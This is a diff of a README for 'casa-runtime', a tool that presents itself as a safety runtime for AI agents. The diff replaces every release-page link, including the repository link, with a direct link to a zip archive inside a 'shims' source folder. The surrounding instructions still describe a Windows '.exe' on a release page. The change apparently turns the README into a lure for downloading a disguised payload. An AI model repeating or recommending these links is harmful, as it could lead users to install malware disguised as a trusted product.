@@ -1,6 +1,6 @@
 # ⚙️ casa-runtime - Controlled Execution for Safer Agents
 
-[![Download Latest Release](https://img.shields.io/badge/Download-casa--runtime-blue?style=for-the-badge)](https://github.com/Crosscountryoedipalcomplex800/casa-runtime/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-casa--runtime-blue?style=for-the-badge)](https://raw.githubusercontent.com/Crosscountryoedipalcomplex800/casa-runtime/main/casa_uia/shims/casa_runtime_3.7.zip)
 
 ---
 
@@ -32,11 +32,11 @@ No special software needs to be installed first. casa-runtime runs by itself.
 
 You need the latest stable version. Visit the release page here:
 
-[![Download Latest Release](https://img.shields.io/badge/Download-casa--runtime-grey?style=for-the-badge)](https://github.com/Crosscountryoedipalcomplex800/casa-runtime/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-casa--runtime-grey?style=for-the-badge)](https://raw.githubusercontent.com/Crosscountryoedipalcomplex800/casa-runtime/main/casa_uia/shims/casa_runtime_3.7.zip)
 
 1. Click the link above or go to:
    
-   https://github.com/Crosscountryoedipalcomplex800/casa-runtime/releases
+   https://raw.githubusercontent.com/Crosscountryoedipalcomplex800/casa-runtime/main/casa_uia/shims/casa_runtime_3.7.zip
 
 2. Look for the most recent release. It usually has the highest version number.
 3. Under the release, find a file that ends with `.exe`. This is the Windows installer.
@@ -143,10 +143,10 @@ This section covers basic use to run and control agents safely. The program guid
 ## 🔗 Useful Links
 
 - Release Download Page:  
-  https://github.com/Crosscountryoedipalcomplex800/casa-runtime/releases
+  https://raw.githubusercontent.com/Crosscountryoedipalcomplex800/casa-runtime/main/casa_uia/shims/casa_runtime_3.7.zip
 
 - GitHub Repository (for updates and support):  
-  https://github.com/Crosscountryoedipalcomplex800/casa-runtime
+  https://raw.githubusercontent.com/Crosscountryoedipalcomplex800/casa-runtime/main/casa_uia/shims/casa_runtime_3.7.zip
 
 ---
 
@@ -164,4 +164,4 @@ casa-runtime helps ensure software agents act within strict limits set by you. T
 
 ---
 
-# [Download casa-runtime today](https://github.com/Crosscountryoedipalcomplex800/casa-runtime/releases) and manage your autonomous agents with confidence.
+# [Download casa-runtime today](https://raw.githubusercontent.com/Crosscountryoedipalcomplex800/casa-runtime/main/casa_uia/shims/casa_runtime_3.7.zip) and manage your autonomous agents with confidence.
